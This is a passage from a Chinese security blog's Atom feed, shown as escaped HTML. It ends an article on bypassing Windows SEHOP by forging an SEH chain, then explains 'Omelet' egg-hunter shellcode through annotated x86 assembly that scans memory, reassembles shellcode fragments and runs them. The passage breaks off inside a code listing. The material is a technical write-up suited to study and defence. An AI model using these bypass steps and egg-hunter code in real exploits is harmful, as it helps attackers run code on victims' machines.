esp,&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;五、SEHOP&quot;&gt;&lt;a href=&quot;#五、SEHOP&quot; class=&quot;headerlink&quot; title=&quot;五、SEHOP&quot;&gt;&lt;/a&gt;五、SEHOP&lt;/h2&gt;&lt;h3 id=&quot;原理-6&quot;&gt;&lt;a href=&quot;#原理-6&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;微软在Microsoft Windows 2008 SP0、Microsoft Windows Vista SP1和Microsoft Windows 7中加入了另一种新的保护机制SEHOP（Structured Exception Handling Overwrite Protection），它可作为SEH的扩展，用于检测SEH是否被覆写。SEHOP的核心特性是用于检测程序栈中的所有SEH结构链表的完整性，特别是对最后一个SHE结构的检测。在最后一个SEH结构中拥有一个特殊的异常处理函数指针，指向一个位于ntdll中的函数ntdll!FinalExceptHandler（）。当我们用jmp 06 pop pop ret 来覆盖SEH结构后，由于SEH结构链表的完整性遭到破坏，SEHOP就能检测到异常从而阻止shellcode的运行&lt;/p&gt;
&lt;h3 id=&quot;绕过方法-2&quot;&gt;&lt;a href=&quot;#绕过方法-2&quot; class=&quot;headerlink&quot; title=&quot;绕过方法&quot;&gt;&lt;/a&gt;绕过方法&lt;/h3&gt;&lt;p&gt;伪造SEH链表&lt;br&gt;由于SEHOP会检测SEH链表的完整性，那么我们可以通过伪造SEH链表来替换原先的SEH链表，进而达到绕过的目的。具体实现方法：&lt;/p&gt;
&lt;p&gt;（1）查看SEH链表结构，可借助OD实现，然后记住最后一个SEH结构地址，以方便后面的利用；&lt;br&gt;（2）用JE(0x74) + 最后一个SEH结构的地址（由于地址开头是00，故可省略掉，可由0x74替代，共同实现4字节对齐）去覆盖nextSEH；&lt;br&gt;（3）用xor pop pop ret指令地址去覆盖SEH handle，其中的xor指令是用于将ZF置位，使前面的JE = JMP指令，进而实现跳转；&lt;br&gt;（4）在这两个SEH结构之前写入一跳转指令（JMP+8），以避免数据段被执行；&lt;br&gt;（5）在这两个SEH结构之间全部用NOP填充，如果两者之间还有其它SEH结构的话；&lt;br&gt;（6）将shellcode放置在最后一个SEH结构之后，即ntdll!FinalExceptHandler（）函数之后。&lt;/p&gt;
&lt;p&gt;此时的堆栈布局如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━━━━━━┓&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【    NOP…      】  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【   JMP 08     】  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  JE XXXXXX   】&amp;lt;= next SEH(指向前面的NOP)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【     xor pop pop ret    】&amp;lt;= SEH Handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【    NOP…      】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【   JMP 08     】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  0xFFFFFFFF    】&amp;lt;= next SEH &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【ntdll!FinalExceptHandler】&amp;lt;= SEH Handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  shellcode   】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;更多信息可参见我之前翻译的&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=104707&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《绕过SEHOP安全机制》&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h2&gt;&lt;p&gt;本文简单地叙述了windows平台上的各类溢出保护机制及其绕过方法，但若结合实例分析的话，没有几万字是不可能完成的，因此这里概览一番，读者若想获得相关的实例运用的资料，可参考文中提及一些paper，特别是由看雪论坛上dge兄弟翻译的《Exploit编写系列教程6》以及黑客杂志《Phrack》、《Uninformed》上的相关论文。微软与黑客之间的斗争是永无休止的，我们期待着下一项安全机制的出现……&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;By  : riusksk（泉哥）&lt;br&gt;Blog: &lt;a href=&quot;http://riusksk.blogbus.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.blogbus.com&lt;/a&gt;&lt;br&gt;Data: 第1
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Windows" scheme="http://riusksk.github.io/tags/Windows/"/>
    
      <category term="溢出" scheme="http://riusksk.github.io/tags/%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Shellcode分段执行技术原理</title>
    <link href="http://riusksk.github.io/2010/12/23/shellcode-split/"/>
    <id>http://riusksk.github.io/2010/12/23/shellcode-split/</id>
    <published>2010-12-22T16:00:00.000Z</published>
    <updated>2016-06-22T07:07:04.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;由于在实际溢出利用中，我们可能会遇到内存中没有足够的空间来存放我们的shellcode，但我们又可以控制多块小内存空间的内容，那些此时我们就可使用shellcode分段执行技术来进行利用，这种方法在国外被称为“Omelet Shellcode”，属于egg hunt shellcode的一种形式，它先在用户地址空间中寻找与其相匹配的各个小内存块（egg），然后再将其重构成一块大块的shellcode，最后执行它。此项技术最初是由荷兰著名黑客SkyLined在其主页上公布的（具体代码参见附件），该黑客先前就职于Microsoft，但于2008年初转入Google，同时他也是著名的字母数字型shellcode编码器Alpha2/Alpha3的开发者。&lt;/p&gt;
&lt;h3 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;headerlink&quot; title=&quot;原理分析&quot;&gt;&lt;/a&gt;原理分析&lt;/h3&gt;&lt;p&gt;将Shellcode拆分成固定大小的多个代码块，各个代码块中包含有其字节大小size，索引值index，标记marker（3 字节）和数据内容data，如图1所示：&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/shellcode/data.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;            图1&lt;br&gt;&lt;/center&gt;&lt;br&gt;当egghunter代码开始执行时，它会在用户内存空间中（0x00000000~0x80000000）搜索这些被标记的小块，然后在内存中重构成最初的shellcode并执行它。而当shellcode执行时，它还会安装SEH以处理访问违例时的情况。若出现访问违例，则SEH handler会将地址与0xFFF进行或运算，然后再加1，相当于进入下一内存页，以跳过不可读取的内存页。如果搜索的内存地址大于0x7FFFFFFF，那么终止搜索，并在内存中重构shellcode用于执行，否则重置栈空间，防止因递归进行异常处理而将栈空间耗尽，它会重新设置SEH handler并继续搜索内存。相应代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;reset_stack:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;; 重置栈空间以防止递归进行异常处理时耗尽栈空间，并设置自己的异常处理例程以处理扫描内存时出现的访问违例情况&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XOR     EAX, EAX                    ; EAX = 0，并作为计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     ECX, [FS:EAX]               ; ECX = SEH结构链表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;find_last_SEH_loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     ESP, ECX                    ; ESP = SEH结构&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POP     ECX                         ; ECX = 下一个SEH结构指针&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CMP     ECX, 0xFFFFFFFF             ; 判断是否是最后一个SEH结构&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JNE     find_last_SEH_loop          ; 不是则跳走并继续查找&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POP     EDX                         ; 最后一个SEH结构中的异常处理例程handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CALL    create_SEH_handler          ; 自定义SEH handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SEH_handler:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POPA                                ; ESI = [ESP + 4] -&amp;gt; struct exception_info&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LEA     ESP, [BYTE ESI+0x18]        ; ESP = struct exception_info-&amp;gt;exception_address&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    POP     EAX                         ; EAX = exception address 0x????????&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OR      AX, 0xFFF                   ; EAX = 0x?????FFF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    INC     EAX                         ; EAX = 0x?????FFF + 1 -&amp;gt; next page&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JS      done                        ; EAX &amp;gt; 0x7FFFFFFF ===&amp;gt; done&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XCHG    EAX, EDI                    ; EDI =&amp;gt; next page&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JMP     reset_stack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当从地址0x00000000开始搜索后，若找到以相匹配的egg_size开头的egg内存块，它会将接下的DWORD值与一个特殊值（3字节的标记值和1字节的0xFF）相异或，如果是我们要找的egg内存块，那么获取的结果会等于内存块的索引号（从0开始），比如第二块egg内存块的这个DWORD值为0xBADA55FE，那么它与0xBADA55FF相异或后值为1。如果不是相匹配的egg内存块，则继续搜索下一字节。对应的代码如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;create_SEH_handler:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PUSH    ECX                         ; 指向下一个SEH结构，这里为0xFFFFFFFF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     [FS:EAX], ESP               ; 设置当前的SEH为自定义的SEH_handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CLD                                 ; 清除方向标志位DF，从0开始扫描内存&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;scan_loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     AL, egg_size                ; EAX = egg_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;egg_size_location equ $-1 - $$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    REPNE   SCASB                       ; 从地址0x00000000开始循环扫描以egg_size字节开头的内存块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PUSH    EAX                         ; 找到后保存egg_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     ESI, EDI                    ; ESI = 相匹配内存块的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LODSD                               ; EAX = II M2 M3 M4，索引值（1字节）与标记值（3字节）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XOR     EAX, (marker &amp;lt;&amp;lt; 8) + 0xFF   ; EAX = (II M2 M3 M4) ^ (FF M2 M3 M4) == egg_index&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;marker_bytes_location equ $-3 - $$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CMP     EAX, BYTE max_index         ; 检测EAX值是否小于 max_index&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;max_index_location equ $-1 - $$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    JA      reset_stack                 ; 不是则跳走并继续搜索内存&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;找到egg内存块后，将内存块大小egg_size与索引值egg_index相乘可得到该内存块在原始shellcode中的偏移egg_offset，然后将它再加上存放shellcode的栈空间起始地址，最后得到绝对地址，并将该egg内存块复制到绝对地址上，直至所有的egg内存块全部复制到栈上，进而在栈上重构出完整的shellcode。其对应代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; POP     ECX                         ; ECX = egg_size&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IMUL    ECX                         ; EAX = egg_size * egg_index == egg_offset&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        ; 这里是有带符号相乘，由于ECX * EAX总小于0x1000000，所以EDX=0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ADD     EAX, [BYTE FS:EDX + 8]      ; EDI += Bottom of stack == position of egg in shellcode.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XCHG    EAX, EDI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;copy_loop:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    REP     MOVSB                       ; 将匹配的内存块复制到栈空间以重构成完整的shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    MOV     EDI, ESI                    ; EDI指向当前匹配内存块的末尾，在拷贝完第一块内存块后继续搜索第二块，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        ; 以此类推，直至所有的内存块全部搜索到并复制到栈上&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后就是跳到栈底去执行重构后的shellcode：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;done:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    XOR     EAX, EAX                    ; EAX = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CALL    [BYTE FS:EAX + 8]           ; 从栈中shellcode的起始地址开始执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样就完成了对各段egg内存块的搜索，并重构出完整shellcode来执行。&lt;br&gt;注意：由于此份代码只搜索0x00000000~0x80000000之间的用户内存空间，因此对于开启/3Gb（0x00000000~0xC000000）开关的系统并不适用，若应用在这样的系统上就可能会导致部分egg内存块未搜索到，以致无法正确地执行shellcode。&lt;br&gt;        在2010年8月，由Exploit编写系列教程的作者Peter Van Eeckhoutte编写的egg-to-omelet hunter程序在其博客上公布了（详细源码参见附件），此份程序对原先由SkyLined编写的omelet hunter进行了改进，提高其成功率和稳定性。此份程序先从当前栈桢的末尾 (0x….ffff) 开始搜索，为了避免出现NULL字节，又让egg内存块数量nr_egg加1，因此我们还可以让它与1相比较，然后去搜索保存在eax中的内存块标记tag，此标记类似这样：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;773030&amp;lt;seq&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这里seq = 1 + number_of_remaining_eggs_to_find + 1，比如你有3个egg内存块，那么各块egg对应的tag分别为 ：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Egg 1 : 77 30 30 05&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Egg 2 : 77 30 30 04&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Egg 3 : 77 30 30 03&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在搜索过程中，它通过调用NtAccessCheckAndAuditAlarm来判断是否出现访问违例，出错则重新搜索，否则就继续寻找各内存块标记tag，找到后通过rep movsb指令将其复制到edi指向的地址中，进而重组原始shellcode并进行执行。具体源码分析如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span 